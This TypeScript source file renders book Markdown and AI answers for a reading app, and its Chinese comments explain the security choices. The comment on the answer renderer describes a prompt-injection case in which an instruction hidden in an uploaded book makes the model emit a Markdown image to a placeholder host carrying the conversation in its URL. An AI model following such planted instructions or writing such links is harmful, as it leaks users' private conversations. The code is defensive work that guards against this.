/* 把一节的 Markdown 渲成可读的块，并把脚注拆出来就地显示。
 * 模型回答另走一台渲染器（`renderAnswer`，见文件下半）。
 *
 * 两个决定值得写下来：
 *
 * **`html: false`**。书是用户自己传的，但解析产物经过了 html2md 这一道，
 * 里面完全可能残留一段没转干净的 `<script>`。渲染器不认 HTML，它就只是一段
 * 会被转义显示出来的字，不是一段会执行的代码。
 *
 * **`typographer: false`**。它会把引号替换成「更漂亮的」样子——那是给英文设计的。
 * 中文的“”本来就是对的，替一遍只会替坏。`breaks` 同理保持 false：
 * 硬换行在 `clean.py` 里已经接过了，这里再把单个换行变成 <br> 等于把它拆回去。
 *
 * 脚注不放页尾。`markdown-it-footnote` 默认在文末堆一个 `<section class="footnotes">`，
 * 读者要点过去再点回来——那正是⑤屏要消掉的那次跳转。所以这里把标记渲成按钮、
 * 把注文抽成数据，交给界面在**它出现的那一段下面**就地展开。
 */
import MarkdownIt from 'markdown-it'
import footnotePlugin from 'markdown-it-footnote'

export interface ProseBlock {
  /** 一个顶层块（段落、标题、引用……）的 HTML */
  html: string
  /** 这一块里出现的脚注编号，按出现顺序 */
  refs: string[]
}

export interface RenderedChapter {
  blocks: ProseBlock[]
  /** 编号 → 注文 HTML */
  footnotes: Map<string, string>
  /** 这一节引的书里的图（images/ 下的文件名），按出现顺序、不重复 */
  images: string[]
}

const md = new MarkdownIt({ html: false, breaks: false, typographer: false }).use(footnotePlugin)

const anchorName = md.renderer.rules.footnote_anchor_name!
const caption = md.renderer.rules.footnote_caption!

md.renderer.rules.footnote_ref = (tokens, idx, options, env, slf) => {
  const id = anchorName(tokens, idx, options, env, slf)
  const label = caption(tokens, idx, options, env, slf)
  // <button> 而不是 <a>：它不去任何地方，它就地展开一张卡。
  // 用链接的话键盘用户按下去会跳走，而「不跳走」正是这件事的全部意义。
  return `<button type="button" class="fn-ref" data-fn="${escapeAttr(id)}">${label}</button>`
}

/* 书里的图。正文写的是 `![](images/x.jpeg)`，照着相对路径去要，拿回来的是前端的
 * index.html。而 `<img src>` 又带不上 Authorization 头，所以这里**先不给 src**，
 * 只记下是哪张图；页面带着 token 取成 blob 之后再填（`withImages`）。
 *
 * 不是书目录里的图（外链）就只留说明文字，不去取：一张外链图等于书替别人记下
 * 「谁在什么时候读到了这一页」。 */
md.renderer.rules.image = (tokens, idx, options, env, slf) => {
  const token = tokens[idx]
  const alt = slf.renderInlineAsText(token.children ?? [], options, env)
  const name = bookImageName(token.attrGet('src') ?? '')
  if (!name) return alt ? `<span class="img-alt">${md.utils.escapeHtml(alt)}</span>` : ''
  return `<img data-book-image="${escapeAttr(name)}" alt="${escapeAttr(alt)}">`
}

/** `images/x.jpeg`（可带 `./` `../`）→ `x.jpeg`；别的一律 null。 */
function bookImageName(src: string): string | null {
  const found = /^(?:\.{1,2}\/)*images\/([^/\\?#]+)$/.exec(src)
  if (!found) return null
  try {
    // markdown-it 会把路径里的中文、空格编码掉；文件名要的是原样
    return decodeURIComponent(found[1])
  } catch {
    return null
  }
}

/** 把取回来的图填进去。还没取到的那几张原样留着（只有说明文字）。 */
export function withImages(blocks: ProseBlock[], urls: Map<string, string>): ProseBlock[] {
  if (!urls.size) return blocks
  return blocks.map((block) => ({
    ...block,
    html: block.html.replace(/<img data-book-image="([^"]*)"/g, (whole, attr: string) => {
      const url = urls.get(unescapeAttr(attr))
      return url ? `<img src="${escapeAttr(url)}" data-book-image="${attr}"` : whole
    })
  }))
}

export function renderChapter(markdown: string): RenderedChapter {
  // 用 DOMParser 而不是正则去拆：页尾那一段是标准结构，按结构拆才靠得住。
  // 解析出来的 document 是惰的，里面的 <script>/<img> 都不会执行、不会发请求。
  const doc = new DOMParser().parseFromString(md.render(markdown), 'text/html')

  const footnotes = new Map<string, string>()
  for (const item of doc.querySelectorAll('.footnotes-list > .footnote-item')) {
    // 回跳箭头「↩」只有在注文待在页尾时才有意义，就地展开后它指向自己
    item.querySelectorAll('.footnote-backref').forEach((a) => a.remove())
    footnotes.set(item.id.replace(/^fn/, ''), item.innerHTML.trim())
  }
  doc.querySelectorAll('.footnotes, .footnotes-sep').forEach((el) => el.remove())

  const images = [
    ...new Set(
      Array.from(
        doc.querySelectorAll('img[data-book-image]'),
        (img) => (img as HTMLElement).dataset.bookImage ?? ''
      ).filter(Boolean)
    )
  ]

  const blocks: ProseBlock[] = []
  for (const el of Array.from(doc.body.children)) {
    blocks.push({
      html: el.outerHTML,
      refs: Array.from(
        el.querySelectorAll('.fn-ref'),
        (b) => (b as HTMLElement).dataset.fn ?? ''
      ).filter(Boolean)
    })
  }
  return { blocks, footnotes, images }
}

/* 模型回答用另一台渲染器。和上面那台只差三处，每处都有具体的理由：
 *
 * **`breaks: true`**。书的正文是 false，因为硬换行已经被 `clean.py` 接过了；
 * 模型从来不折行，它写下的每一个单换行都是有意的——「**一、沙门阶段**↵他先学……」
 * 接成一段，小标题就和正文粘在一起了。`html` 与 `typographer` 的理由两边一样，照旧关着。
 *
 * **不认图片**。回答是模型写的，而模型读的是用户传进来的书。书里藏一句指令，
 * 就能让它写出 `![](https://某处/?q=刚才聊的内容)`——渲出来浏览器当场去取，
 * 不用谁点一下，对话就出去了。关掉之后 `![x](url)` 只剩一个「!」和一条普通链接。
 *
 * **链接开新标签页**。点一下不该把正在流的回答关掉；`noreferrer` 不让对方知道
 * 是从哪一个会话点过去的。
 *
 * 不挂脚注插件：回答里没有 `[^n]`，那是书的写法。
 */
const answerMd = new MarkdownIt({ html: false, breaks: true, typographer: false }).disable('image')

answerMd.renderer.rules.link_open = (tokens, idx, options, _env, slf) => {
  tokens[idx].attrSet('target', '_blank')
  tokens[idx].attrSet('rel', 'noopener noreferrer nofollow')
  return slf.renderToken(tokens, idx, options)
}

/** 一条回答的 HTML。流到一半也照样渲——没闭合的 `**` 先原样露着，闭合了就收起来。 */
export function renderAnswer(markdown: string): string {
  return answerMd.render(markdown)
}

function escapeAttr(value: string): string {
  return value.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;')
}

/** 反过来。DOM 序列化属性时还会转义 `>` 与不换行空格，一并认回来。 */
function unescapeAttr(value: string): string {
  return value
    .replace(/&quot;/g, '"')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&nbsp;/g, '\u00a0')
    .replace(/&amp;/g, '&')
}
